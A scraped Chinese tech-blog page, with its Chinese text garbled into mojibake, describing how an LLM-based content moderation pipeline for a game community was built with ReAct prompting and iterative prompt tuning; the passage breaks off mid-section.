content="ä»è¯¯åˆ¤åˆ°ç²¾å‡†ï¼šæ¸¸æˆç¤¾åŒº AI å®¡æ ¸çš„å·¥ç¨‹åŒ–å®è·µ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-08T01:58:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äºšé©¬é€Šäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2850395271209496"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»è¯¯åˆ¤åˆ°ç²¾å‡†ï¼šæ¸¸æˆç¤¾åŒº AI å®¡æ ¸çš„å·¥ç¨‹åŒ–å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2850395271209496/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äºšé©¬é€Šäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T01:58:51.000Z" title="Mon Dec 08 2025 01:58:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs3.cn-north-1.amazonaws.com.cn%2Fawschinablog%2Fblogbanner-newnew.png" target="_blank" title="https://s3.cn-north-1.amazonaws.com.cn/awschinablog/blogbanner-newnew.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c4a1d8bb6d54df78712ebd5c0284592~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763948&amp;x-signature=wF7aKmJvqYKvL53finN92yp%2FX1g%3D" alt="" loading="lazy"/></a></p>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p>æ¸¸æˆç¤¾åŒºä½œä¸ºå…¸å‹çš„ UGCï¼ˆç”¨æˆ·ç”Ÿæˆå†…å®¹ï¼‰åœºæ™¯ï¼Œç”¨æˆ·éå¸ƒå…¨çƒï¼Œæ¶‰åŠä¸­ã€è‹±ã€æ—¥ã€éŸ©ã€ä¿„ã€è¥¿ç­ç‰™è¯­ã€é˜¿æ‹‰ä¼¯è¯­ã€æ³•è¯­ç­‰å¤šç§è¯­è¨€ã€‚è®¨è®ºæ°›å›´æ´»è·ƒï¼Œä½†å…¶ä¸­ä¸å¯é¿å…ä¼šå¤¹æ‚ è¾±éª‚ã€ä»‡æ¨ã€è‰²æƒ…ã€æš´åŠ›ã€æ¶‰æ”¿ ç­‰è¿è§„è¨€è®ºã€‚</p>
<p>å¹³å°éœ€è¦åœ¨ä¸ä¼¤å®³ç¤¾åŒºæ°›å›´çš„å‰æä¸‹ï¼Œåšåˆ°Â <strong>åŠæ—¶ã€å‡†ç¡®çš„å†…å®¹å®¡æ ¸</strong>ã€‚ä½†ä¼ ç»Ÿè§„åˆ™å¼•æ“å®¹æ˜“å‡ºç°â€œè¯¯æ€â€æˆ–â€œæ¼åˆ¤â€ï¼Œç›´æ¥ä¾èµ–å¤§è¯­è¨€æ¨¡å‹å®¡æ ¸åˆå­˜åœ¨Â <strong>å‡†ç¡®ç‡ä¸é«˜ã€åˆ†ç±»ä¸ç¨³å®š</strong>Â çš„é—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬é‡åˆ°çš„å®¢æˆ·éœ€æ±‚è¿˜æœ‰ä¸€äº›é¢å¤–æŒ‘æˆ˜ï¼š</p>
<ul>
<li>å®¡æ ¸å¯¹è±¡æ˜¯<strong>é•¿æ–‡æœ¬</strong>ï¼ˆåŠ¨è¾„ä¸Šåƒå­—ç¬¦ï¼‰ï¼›</li>
<li>æ— æ³•é€šè¿‡å‘é‡æ£€ç´¢æˆ– RAG åˆ‡ç‰‡ï¼Œå› ä¸ºé•¿æ–‡æœ¬æ‹†åˆ†åä¸Šä¸‹æ–‡ä¸¢å¤±ï¼Œç›¸å…³åº¦å¾ˆå·®ï¼›</li>
<li>æ¨¡å‹éœ€è¦ä¸€æ¬¡æ€§ç»™å‡ºÂ <strong>åˆ¤å®šç»“æœï¼ˆPass/Reject</strong> <strong>ï¼‰</strong> ï¼Œå¹¶åœ¨ Reject æ—¶æŒ‡å®šÂ <strong>10</strong> <strong>ç§è¿è§„åˆ†ç±»ä¹‹ä¸€</strong>ã€‚</li>
</ul>
<p>åœ¨è¿™æ ·çš„èƒŒæ™¯ä¸‹ï¼Œæˆ‘ä»¬ä¸ºä¸€å®¶æ¸¸æˆå…¬å¸è½åœ°äº†ä¸€å¥—Â <strong>æç¤ºè¯å·¥ç¨‹ + ReAct</strong> <strong>æ¡†æ¶ +</strong> <strong>å·¥ç¨‹åŒ–æ¶æ„</strong>Â çš„ AI å®¡æ ¸æ–¹æ¡ˆã€‚æœ€ç»ˆæ•´ä½“å‡†ç¡®ç‡æå‡åˆ°äº†Â <strong>81%</strong> ã€‚éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå¯¹æ¯”åŸºå‡†æ˜¯å®¢æˆ·çš„äººå·¥å®¡æ ¸æ•°æ®ï¼Œè€Œäººå·¥æ ‡æ³¨è¿‡ç¨‹å­˜åœ¨â€œå¤šäººå¤šæ—¥ã€ç¼ºä¹å¤æ ¸â€çš„æƒ…å†µï¼Œå£å¾„å¹¶ä¸å®Œå…¨ç»Ÿä¸€ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åªèƒ½è¯´æ¨¡å‹çš„ 81% ä¸€è‡´æ€§<strong>å¤§ä½“ä¸Šè¾¾åˆ°äº†äººå·¥å®¡æ ¸çš„æ°´å¹³</strong>ï¼Œå…·ä½“æ•ˆæœè¿˜éœ€ç»“åˆæ›´ä¸¥æ ¼çš„æ ‡æ³¨ä½“ç³»è¿›ä¸€æ­¥éªŒè¯ã€‚</p>
<blockquote>
<p>ğŸ“¢é™æ—¶æ’æ’­ï¼šæ— éœ€ç®¡ç†åŸºç¡€è®¾æ–½ï¼Œåˆ©ç”¨äºšé©¬é€ŠæŠ€æœ¯ä¸ç”Ÿæ€ï¼Œå¿«é€Ÿé›†æˆä¸éƒ¨ç½²ç”Ÿæˆå¼AIæ¨¡å‹èƒ½åŠ›ã€‚</p>
<p>âœ¨ ç²¾å¿ƒè®¾è®¡ï¼Œæ—¨åœ¨å¼•å¯¼æ‚¨æ·±å…¥æ¢ç´¢Amazon Bedrockçš„æ¨¡å‹é€‰æ‹©ä¸è°ƒç”¨ã€æ¨¡å‹è‡ªåŠ¨åŒ–è¯„ä¼°ä»¥åŠå®‰å…¨å›´æ (Guardrail)ç­‰é‡è¦åŠŸèƒ½ã€‚</p>
<p>â©å¿«å¿«ç‚¹å‡»è¿›å…¥ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejinhead_0606%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejinhead_0606" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejinhead_0606&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejinhead_0606" ref="nofollow noopener noreferrer">å¤šæ¨¡ä¸€ç«™é€š â€”â€” Amazon Bedrock ä¸Šçš„åŸºç¡€æ¨¡å‹åˆä½“éªŒ</a>ã€‹å®éªŒæ„å»ºæ— é™, æ¢ç´¢å¯ç¨‹ï¼</p>
</blockquote>
<h2 data-id="heading-1">æ•´ä½“æ–¹æ¡ˆæ¶æ„</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2854ab2d20944099a84c17bcdd3fd2c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763948&amp;x-signature=e8%2BLZkluVgimOQGbAk1aDnH4d30%3D" alt="299042ed769fca693f09795d0e851c31.png" loading="lazy"/></p>
<h2 data-id="heading-2">å·¥ç¨‹åŒ–è½åœ°èƒ½åŠ›</h2>
<p>åœ¨æ–‡æœ¬å®¡æ ¸é¡¹ç›®ä¸­ï¼Œæç¤ºè¯ä¼˜åŒ–åªæ˜¯å…¶ä¸­ä¸€æ­¥ã€‚çœŸæ­£æ”¯æ’‘ä¸šåŠ¡è½åœ°çš„ï¼Œæ˜¯ä¸€æ•´å¥—Â <strong>å¯è§‚æµ‹ã€å¯å›æ»šã€å¯æ‰©å±•</strong>Â çš„å·¥ç¨‹æ¶æ„ï¼š</p>
<ul>
<li><strong>è“ç»¿éƒ¨ç½²</strong>ï¼šé€šè¿‡ Amazon Bedrock çš„å¤šç‰ˆæœ¬éƒ¨ç½²æœºåˆ¶ï¼Œæç¤ºè¯ä¼˜åŒ–å’Œæ¨¡å‹æ›´æ–°å¯ä»¥å®‰å…¨ä¸Šçº¿ï¼Œæ”¯æŒç°åº¦/å›æ»šã€‚</li>
<li><strong>æ—¥å¿—ä¸åˆ¤ä¾‹åº“</strong>ï¼šæ‰€æœ‰å®¡æ ¸è¯·æ±‚å’Œç»“æœå†™å…¥ DynamoDB / OpenSearchï¼Œç”¨äºåç»­çš„å›æº¯åˆ†æä¸æç¤ºè¯å†è®­ç»ƒã€‚</li>
<li><strong>é…ç½®ä¸æµæ§</strong>ï¼šAmazon AppConfig + æ§åˆ¶ Lambdaï¼Œä¿è¯åœ¨é«˜å¹¶å‘/å¤§æµé‡åœºæ™¯ä¸‹ç³»ç»Ÿç¨³å®šã€‚</li>
<li><strong>ç«¯åˆ°ç«¯å¯ç›‘æ§</strong>ï¼šä»è¯·æ±‚å…¥å£åˆ°æœ€ç»ˆå­˜å‚¨éƒ½æœ‰æ—¥å¿—é“¾è·¯ï¼Œæ–¹ä¾¿å¿«é€Ÿæ’æŸ¥é—®é¢˜ã€‚</li>
</ul>
<h2 data-id="heading-3">æç¤ºè¯å†·å¯åŠ¨é˜¶æ®µï¼šæç¤ºè¯ä» 0 åˆ° 1</h2>
<p>åœ¨æ²¡æœ‰ä»»ä½•â€œé»„é‡‘æç¤ºè¯â€çš„å‰æä¸‹ï¼Œæ‹¿åˆ°å¯ç”¨çš„æç¤ºè¯æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œç”šè‡³å¯ä»¥ç›´æ¥è®©AIç”Ÿæˆä¸€ä¸ªã€‚</p>
<p>ä½†æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨å†·å¯åŠ¨çš„åŠæ³•ï¼Œå…ˆè®©æ¨¡å‹æŠŠå®¢æˆ·ç»™çš„å‡ åƒæ¡æ ·æœ¬è¿‡ä¸€éã€‚æ¯è·‘ä¸€æ¡ï¼Œå°±æ‹¿å®ƒçš„ç»“æœå’Œäººå·¥æ ‡æ³¨æ¯”å¯¹ï¼ŒæŠŠæç¤ºè¯é‡Œæœ‰é—®é¢˜çš„åœ°æ–¹ä¿®æ‰ã€‚è¿™æ ·å¾ªç¯ä¸€è½®ï¼Œç­‰äºå¸®æˆ‘ä»¬å‡‘å‡ºäº†ä¸€ä¸ªâ€œèƒ½è·‘â€çš„åˆå§‹ç‰ˆæœ¬ï¼Œåé¢å†æ…¢æ…¢æ‰“ç£¨ã€‚</p>
<p>æˆ‘ä»¬çš„åšæ³•æ˜¯ï¼š</p>
<ol>
<li>è®©å¤§æ¨¡å‹é€æ¡è¯»å–å®¢æˆ·æä¾›çš„æ•°åƒæ¡äººå·¥å®¡æ ¸æ ·æœ¬ï¼ˆæ¯æ¡éƒ½åŒ…å«æ–‡æœ¬ã€åˆ¤å®šç»“æœä»¥åŠè¿è§„åˆ†ç±»ï¼‰ã€‚</li>
<li>åœ¨é˜…è¯»è¿‡ç¨‹ä¸­ï¼Œæ¨¡å‹ä¼šå°è¯•åŸºäºå·²æœ‰æ ·æœ¬ç”Ÿæˆæç¤ºè¯ã€‚</li>
<li>æ¯è¯»å–ä¸€æ¡æ ·æœ¬ï¼Œå°±å¯¹æç¤ºè¯åšä¸€æ¬¡å¾®è°ƒï¼Œé€æ­¥ä¿®æ­£ä¸åˆç†çš„éƒ¨åˆ†ã€‚</li>
<li>å®Œæˆä¸€è½®å…¨é‡æ ·æœ¬åï¼Œå°±å¾—åˆ°ä¸€ä¸ªÂ <strong>åˆå§‹æç¤ºè¯</strong>ï¼Œä½œä¸ºè¿›ä¸€æ­¥ä¼˜åŒ–çš„åŸºçº¿ã€‚</li>
</ol>
<p>ä¾‹å¦‚ï¼Œæœ€åˆæˆ‘ä»¬ç”Ÿæˆçš„æç¤ºè¯å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-erlang" lang="erlang">You are a content moderation model.
## Task
Analyze the following user-generated text.
<span class="hljs-number">1</span>. Classify it as <span class="hljs-string">"Pass"</span> or <span class="hljs-string">"Reject"</span>.
<span class="hljs-number">2</span>. If <span class="hljs-string">"Reject"</span>, assign one <span class="hljs-keyword">of</span> these categories:
   - Hate Speech
   - Sexual Content
   - Violence
   - Political Sensitivity
   - Spam / Ads
   - Self-harm
   ...
## Output Format (JSON)
{<span class="hljs-string">"result"</span>: <span class="hljs-string">"Reject"</span>, <span class="hljs-string">"category"</span>: <span class="hljs-string">"Hate Speech"</span>}
</code></pre>
<p>åœ¨å†·å¯åŠ¨é˜¶æ®µï¼Œè¿™ä¸ªæç¤ºè¯çš„å‡†ç¡®ç‡å¹¶ä¸ç®—é«˜ï¼Œå®¹æ˜“å‡ºç°Â <strong>ç°è‰²è¯­å¢ƒè¯¯åˆ¤</strong>ï¼ˆä¾‹å¦‚æŠŠäºŒæ¬¡å…ƒæ¢—è¯¯åˆ¤æˆè‰²æƒ…å†…å®¹ï¼‰ï¼Œæˆ–è€…Â <strong>å¤šè¯­è¨€è¦†ç›–ä¸è¶³</strong>ï¼ˆå¯¹é˜¿æ‹‰ä¼¯è¯­ã€è¥¿ç­ç‰™è¯­ç­‰çš„åˆ¤å®šä¸ç¨³å®šï¼‰ã€‚ä½†å®ƒä¸ºåç»­ä¼˜åŒ–å¥ å®šäº†åŸºç¡€ã€‚</p>
<h2 data-id="heading-4">ReAct æ¡†æ¶å¼•å…¥ï¼šè®©æ¨¡å‹â€œå…ˆæ€è€ƒï¼Œå†è¡ŒåŠ¨â€</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F472b07b9fcf2c2451e8781e944bf5f77cd8457c8%2F2025%2F09%2F29%2Fcommunities-2.png" target="_blank" title="https://d2908q01vomqb2.cloudfront.net/472b07b9fcf2c2451e8781e944bf5f77cd8457c8/2025/09/29/communities-2.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b41d7b09a65b43c58286207f71bad4e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763948&amp;x-signature=WLQZaU4vN9R877rQ5j7QzV4EIXg%3D" alt="" loading="lazy"/></a></p>
<p>å†·å¯åŠ¨é˜¶æ®µå¾—åˆ°çš„æç¤ºè¯è™½ç„¶èƒ½è·‘é€šæµç¨‹ï¼Œä½†åœ¨ä¸€äº›å…³é”®é—®é¢˜ä¸Šä»ç„¶å­˜åœ¨ä¸è¶³ï¼š</p>
<ul>
<li><strong>ç°è‰²è¯­å¢ƒ</strong>ï¼šä¾‹å¦‚äºŒæ¬¡å…ƒæ¢—ã€è®½åˆºè¯­æ°”ï¼Œå®¹æ˜“è¢«è¯¯åˆ¤ä¸ºè¿è§„ã€‚</li>
<li><strong>å¤šè¯­è¨€ä¸€è‡´æ€§</strong>ï¼šæŸäº›è¯­è¨€ï¼ˆå¦‚é˜¿æ‹‰ä¼¯è¯­ã€è¥¿ç­ç‰™è¯­ï¼‰åˆ†ç±»ä¸ç¨³å®šã€‚</li>
<li><strong>è¾“å‡ºéšæœºæ€§</strong>ï¼šç›¸åŒè¾“å…¥å¤šæ¬¡æµ‹è¯•ï¼Œç»“æœå¯èƒ½ä¸åŒã€‚</li>
</ul>
<p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬åœ¨æç¤ºè¯ä¸­å¼•å…¥äº†Â <strong>ReAct</strong> <strong>ï¼ˆReason + Act</strong> <strong>ï¼‰æ¡†æ¶</strong>ã€‚</p>
<p><strong>ReAct</strong> <strong>çš„æ ¸å¿ƒæ€æƒ³</strong>æ˜¯è®©å¤§æ¨¡å‹å…ˆè¿›è¡Œæ˜¾å¼çš„â€œæ¨ç†â€æ­¥éª¤ï¼Œå†åšæœ€ç»ˆçš„â€œè¡ŒåŠ¨â€è¾“å‡ºã€‚è¿™æ ·å¯ä»¥å‡å°‘éšæœºæ€§ï¼Œå¹¶æé«˜å¯è§£é‡Šæ€§ã€‚</p>
<h3 data-id="heading-5">ReAct æ¡†æ¶åœ¨å®¡æ ¸åœºæ™¯ä¸­çš„æ‹†è§£</h3>
<ol>
<li>
<p><strong>Reasoning</strong> <strong>ï¼ˆæ€è€ƒï¼‰</strong> ï¼š</p>
<ul>
<li>Step 1: ç¡®å®šæ–‡æœ¬è¯­è¨€</li>
<li>Step 2: æå–æ½œåœ¨è¿è§„å…³é”®è¯æˆ–çŸ­è¯­</li>
<li>Step 3: å°†å…³é”®è¯ä¸è¿è§„ç±»åˆ«è¿›è¡ŒåŒ¹é…</li>
<li>Step 4: æ ¹æ®ä¸Šä¸‹æ–‡å’Œç±»åˆ«ï¼Œå†³å®š Pass / Reject</li>
</ul>
</li>
<li>
<p><strong>Action</strong> <strong>ï¼ˆè¡ŒåŠ¨ï¼‰</strong> ï¼š</p>
<ul>
<li>è¾“å‡ºæœ€ç»ˆ JSON ç»“æœï¼ˆåˆ¤å®š + ç±»åˆ«ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6">ç¤ºä¾‹æç¤ºè¯ç‰‡æ®µ</h3>
<p>ä¸‹é¢æ˜¯æˆ‘ä»¬åœ¨ ReAct æ¡†æ¶ä¸‹çš„ä¸€éƒ¨åˆ†æç¤ºè¯ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">You are a professional content moderation assistant.  
Follow the steps below before giving the final output:  

<span class="hljs-keyword">Step</span> <span class="hljs-number">1</span>: Identify the language <span class="hljs-keyword">of</span> the <span class="hljs-keyword">text</span>.  
<span class="hljs-keyword">Step</span> <span class="hljs-number">2</span>: Extract any potentially offensive <span class="hljs-built_in">or</span> sensitive words.  
<span class="hljs-keyword">Step</span> <span class="hljs-number">3</span>: Match the extracted words <span class="hljs-keyword">to</span> one <span class="hljs-keyword">of</span> the violation categories.  
<span class="hljs-keyword">Step</span> <span class="hljs-number">4</span>: Decide whether the <span class="hljs-keyword">text</span> <span class="hljs-built_in">is</span> <span class="hljs-string">"Pass"</span> <span class="hljs-built_in">or</span> <span class="hljs-string">"Reject"</span>.  

<span class="hljs-keyword">Finally</span>, output ONLY <span class="hljs-keyword">in</span> the following JSON format:  
{<span class="hljs-string">"result"</span>: <span class="hljs-string">"Reject"</span>, <span class="hljs-string">"category"</span>: <span class="hljs-string">"Hate Speech"</span>}
</code></pre>
<p>è¿™æ ·è®¾è®¡åï¼Œå‡†ç¡®ç‡è™½ä¸é«˜ï¼Œå®¹æ˜“æŠŠäºŒæ¬¡å…ƒæ¢—å½“æˆè‰²æƒ…ï¼Œæˆ–å¯¹å°è¯­ç§åˆ¤å®šä¸ç¨³ã€‚ä½†å®ƒç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªèµ·ç‚¹ã€‚</p>
<h3 data-id="heading-7">ReAct æ¡†æ¶ä¸‹çš„å®ç°ç¤ºä¾‹ï¼ˆPython ä¼ªä»£ç ï¼‰</h3>
<p>åœ¨å·¥ç¨‹è½åœ°ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ Agent æ¡†æ¶è°ƒç”¨å¤§æ¨¡å‹ï¼Œæ¥æ‰§è¡Œä¸Šè¿° ReAct æ¨ç†ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> strands <span class="hljs-keyword">import</span> Agent, tool
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">moderation_tool</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""
    Classify the input text into Pass/Reject and category using ReAct framework.
    """</span>
    reasoning_prompt = <span class="hljs-string">f"""
    Step 1: Identify language.
    Step 2: Extract potentially offensive words or sensitive context.
    Step 3: Match with violation categories.
    Step 4: Decide Pass or Reject.
    Text: <span class="hljs-subst">{text}</span>
    """</span>
    <span class="hljs-comment"># è°ƒç”¨å¤§æ¨¡å‹</span>
    result = llm_call(reasoning_prompt)
    <span class="hljs-keyword">return</span> result
<span class="hljs-comment"># ç¤ºä¾‹è°ƒç”¨</span>
<span class="hljs-built_in">print</span>(moderation_tool(<span class="hljs-string">"This game sucks, I hope the devs all die in a fire."</span>))
<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹: {"result": "Reject", "category": "Hate Speech"}</span>
</code></pre>
<p>åœ¨ ReAct æœºåˆ¶ä¸‹ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°æ¨¡å‹çš„è¡¨ç°æ˜æ˜¾æ›´åŠ ç¨³å®šï¼š</p>
<ul>
<li>å¯¹å¤šè¯­è¨€è¾“å…¥çš„åˆ†ç±»ä¸€è‡´æ€§å¢å¼ºï¼›</li>
<li>å¯¹ç°è‰²è¯­å¢ƒï¼ˆå¦‚â€œç©æ¢—â€ï¼‰çš„è¯¯åˆ¤æ˜¾è‘—å‡å°‘ï¼›</li>
<li>å®¡æ ¸ç†ç”±é€æ˜ï¼Œå¯ä»¥å¤ç›˜å’Œè§£é‡Šã€‚</li>
</ul>
<h2 data-id="heading-8">å¤šè½®å¾ªç¯ä¼˜åŒ–ï¼šä» 3 è½®åˆ° 10+ è½®ï¼Œæˆ‘ä»¬å¦‚ä½•é€‰å®š 5 è½®</h2>
<p>åœ¨å¼•å…¥ ReAct ä¹‹åï¼Œæˆ‘ä»¬å¯¹â€œ<strong>æ¯è½®ï¼šå…¨é‡è·‘æ ·æœ¬ â†’</strong> <strong>çº é”™ â†’</strong> <strong>ä¿®æç¤ºè¯</strong>â€çš„é—­ç¯è¿›è¡Œäº†ç³»ç»ŸåŒ–å®éªŒï¼Œå¯¹æ¯”ä¸åŒè½®æ•°çš„æ”¶ç›Šä¸æˆæœ¬ï¼š</p>
<ul>
<li>
<p><strong>3</strong> <strong>è½®ï¼šæ¬ æ‹Ÿåˆ</strong></p>
<ul>
<li>å…¸å‹é—®é¢˜ï¼šä»ç„¶å­˜åœ¨å¤šè¯­è¨€ä¸€è‡´æ€§ä¸è¶³ã€ç°è‰²è¯­å¢ƒè¯¯åˆ¤åå¤šã€‚</li>
<li>ç°è±¡ï¼šæŒ‡æ ‡æå‡æ˜æ˜¾ä½äº 5 è½®ï¼Œå‘ˆâ€œä¸Šå‡æœªé¥±å’Œâ€çŠ¶æ€ã€‚</li>
</ul>
</li>
<li>
<p><strong>5</strong> <strong>è½®ï¼šæ•ˆæœ-</strong> <strong>æˆæœ¬æœ€ä¼˜ç‚¹</strong></p>
<ul>
